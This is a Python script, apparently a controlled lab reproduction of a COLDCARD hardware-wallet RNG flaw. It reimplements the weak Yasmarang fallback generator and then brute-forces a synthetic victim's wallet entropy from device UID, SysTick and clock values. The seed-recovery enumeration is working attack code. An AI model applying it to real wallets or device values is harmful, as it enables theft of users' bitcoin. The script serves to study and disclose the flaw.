#!/usr/bin/env python3
"""
COLDCARD RNG vulnerability — controlled lab reproduction (July 2026 incident).

WHAT THIS IS
    A self-contained demonstration of the *mechanism*: it reproduces the broken
    firmware RNG path and shows that a device's 32-byte wallet entropy becomes a
    deterministic function of a few low-entropy device values, then confirms an
    "attacker" who only knows the approximate creation time can regenerate a
    "victim's" entropy by enumerating a small candidate space.

WHAT THIS IS NOT
    It does NOT touch the Bitcoin network, does NOT check balances, and does NOT
    target any real address. The victim is a synthetic device created in-process.
    This reproduces the vulnerability; it is not a wallet sweeper.

    Legitimate uses: understanding the bug, a vendor-style regression test, or
    regenerating YOUR OWN seed from YOUR OWN device values to check exposure.

SOURCES
    Block Engineering: engineering.block.xyz/blog/predictable-rng-fallback-and-32-bit-reseed-in-coldcard-firmware
    Coinkite:          blog.coinkite.com/entropy-technical-backgrounder/
"""

import hashlib

MASK32 = 0xFFFFFFFF


# ---------------------------------------------------------------------------
# Yasmarang PRNG (Ilya Levin) — the non-cryptographic generator MicroPython
# uses as its software fallback, and the one libngu also instantiates.
# ---------------------------------------------------------------------------
class Yasmarang:
    def __init__(self, pad, n, d, dat=0):
        self.pad = pad & MASK32
        self.n = n & MASK32
        self.d = d & MASK32
        self.dat = dat & 0xFF

    def next_u32(self):
        self.pad = (self.pad + self.dat + self.d * self.n) & MASK32
        self.pad = ((self.pad << 3) | (self.pad >> 29)) & MASK32   # rotate-left 3
        self.n = self.pad | 2
        self.d = (self.d ^ (((self.pad << 31) | (self.pad >> 1)) & MASK32)) & MASK32
        self.dat = (self.dat ^ (self.pad & 0xFF) ^ ((self.d >> 8) & 0xFF) ^ 1) & 0xFF
        out = (self.pad ^ ((self.d << 5) & MASK32) ^ (self.pad >> 18) ^ ((self.dat << 1) & MASK32))
        return out & MASK32


# ---------------------------------------------------------------------------
# The buggy firmware path.
#
# BUG: board config set MICROPY_HW_ENABLE_RNG = 0 to disable this fallback, but
# libngu guarded on `#ifndef MICROPY_HW_ENABLE_RNG` (exists?) instead of
# `#if MICROPY_HW_ENABLE_RNG` (nonzero?). The macro *was* defined (as 0), so the
# guard bound wallet generation to this software fallback with no user-visible
# symptom. `ckcc.rng_bytes()` (real hardware RNG) still existed but wasn't used
# for wallet seeds.
# ---------------------------------------------------------------------------
def rng_get_fallback(uid_low32, systick_val, rtc_tr, rtc_ssr):
    """MicroPython fallback: Yasmarang seeded ONCE from device values, never reseeded."""
    pad = (uid_low32 ^ systick_val) & MASK32
    return Yasmarang(pad=pad, n=rtc_tr, d=rtc_ssr, dat=0)


def libngu_public_stream():
    """libngu's own Yasmarang — seeded with PUBLIC CONSTANTS, so zero entropy."""
    return Yasmarang(pad=0x0A8CE26F, n=69, d=233, dat=0)


def ngu_random_bytes(nbytes, uid_low32, systick_val, rtc_tr, rtc_ssr):
    """
    Reproduces ngu.random.bytes(n): each 32-bit word is
        chip = rng_get()  XOR  my_yasmarang()
    XOR of two reproducible streams is reproducible — no entropy is added.
    """
    a = rng_get_fallback(uid_low32, systick_val, rtc_tr, rtc_ssr)
    b = libngu_public_stream()
    out = bytearray()
    while len(out) < nbytes:
        word = (a.next_u32() ^ b.next_u32()) & MASK32
        out += word.to_bytes(4, "little")
    return bytes(out[:nbytes])


def sha256d(b):
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()


def wallet_entropy(uid_low32, systick_val, rtc_tr, rtc_ssr):
    """
    Reproduces COLDCARD wallet-seed generation:
        seed = ngu.random.bytes(32)
        assert len(set(seed)) > 4          # only catches trivial failures
        return sha256d(seed)               # 32-byte BIP39 entropy (24 words)
    sha256d makes the OUTPUT look uniform but cannot enlarge the INPUT family:
    at most one candidate entropy per (uid, systick, rtc) tuple.
    """
    seed = ngu_random_bytes(32, uid_low32, systick_val, rtc_tr, rtc_ssr)
    assert len(set(seed)) > 4
    return sha256d(seed)


# ---------------------------------------------------------------------------
# DEMONSTRATION — synthetic victim vs. bounded attacker enumeration.
# ---------------------------------------------------------------------------
def demo():
    print("=" * 70)
    print("COLDCARD RNG vulnerability — controlled reproduction (synthetic)")
    print("=" * 70)

    # --- Synthetic victim device (these values would be secret in reality) ---
    # STM32 96-bit UID is structured; the low 32 bits used here are partly
    # predictable (wafer/lot fields). We treat the low 16 bits as the unknown
    # part for this demo. SysTick has <=80,000 states. RTC = creation time.
    victim_uid_low32 = 0x5A3C_00A7     # attacker "knows" high half, low 16 unknown
    victim_systick   = 41_237          # 0 .. 80_000
    victim_rtc_tr    = 0x00_14_32_07   # BCD-ish time-of-day register value
    victim_rtc_ssr   = 0x0000_04E1     # sub-second counter

    victim_entropy = wallet_entropy(
        victim_uid_low32, victim_systick, victim_rtc_tr, victim_rtc_ssr
    )
    print(f"\n[victim]  32-byte BIP39 entropy = {victim_entropy.hex()}")
    print("          (in a real wallet this deterministically yields the")
    print("           24-word mnemonic and every derived key/address)")

    # --- Attacker knowledge: approximate creation time + Coldcard UID structure ---
    # Enumerate only the UNKNOWN low bits. This is a bounded, in-memory search
    # over a SYNTHETIC target — no network, no real addresses.
    uid_hi = victim_uid_low32 & 0xFFFF_0000
    uid_unknown_bits = 16          # low 16 bits of UID
    systick_hi = 0
    # Attacker knows creation time to the second -> RTC_TR fixed; SSR narrow window.
    rtc_tr = victim_rtc_tr
    ssr_window = range(victim_rtc_ssr - 8, victim_rtc_ssr + 8)  # +/- a few ticks

    print(f"\n[attacker] enumerating {2**uid_unknown_bits} UID candidates x "
          f"{len(ssr_window)} SSR x SysTick window ...")

    found = None
    tried = 0
    # Keep the SysTick sweep tiny for a fast demo; widen in a real analysis.
    for systick in range(victim_systick - 3, victim_systick + 3):
        for ssr in ssr_window:
            for low in range(2 ** uid_unknown_bits):
                tried += 1
                cand_uid = uid_hi | low
                if wallet_entropy(cand_uid, systick, rtc_tr, ssr) == victim_entropy:
                    found = (cand_uid, systick, rtc_tr, ssr)
                    break
            if found:
                break
        if found:
            break

    print(f"[attacker] candidates tested: {tried:,}")
    if found:
        print(f"[attacker] MATCH -> uid_low32=0x{found[0]:08X} "
              f"systick={found[1]} rtc_tr=0x{found[2]:08X} rtc_ssr=0x{found[3]:04X}")
        print("[attacker] regenerated the victim's exact wallet entropy.\n")
    else:
        print("[attacker] no match in demo window (widen the ranges).\n")

    # --- Search-space accounting (why ~40 bits, not 128) ---
    print("-" * 70)
    print("Search-space accounting (realistic attacker knowledge):")
    print("  UID low bits (unpredictable part) .... ~2^16 - 2^24")
    print("  SysTick at seed time ................. ~2^17  (<=80,000 states)")
    print("  RTC time-of-day (approx. known) ...... small if creation ~known")
    print("  ---------------------------------------------------------------")
    print("  Joint effective search space ......... ~2^40  (Mk2/Mk3)")
    print("  Intended BIP39 entropy ............... 2^128")
    print("  sha256d() does NOT help: it maps a <=2^40 input family to a")
    print("  <=2^40 output family. Hashing a small set keeps it small.")
    print("=" * 70)


if __name__ == "__main__":
    demo()
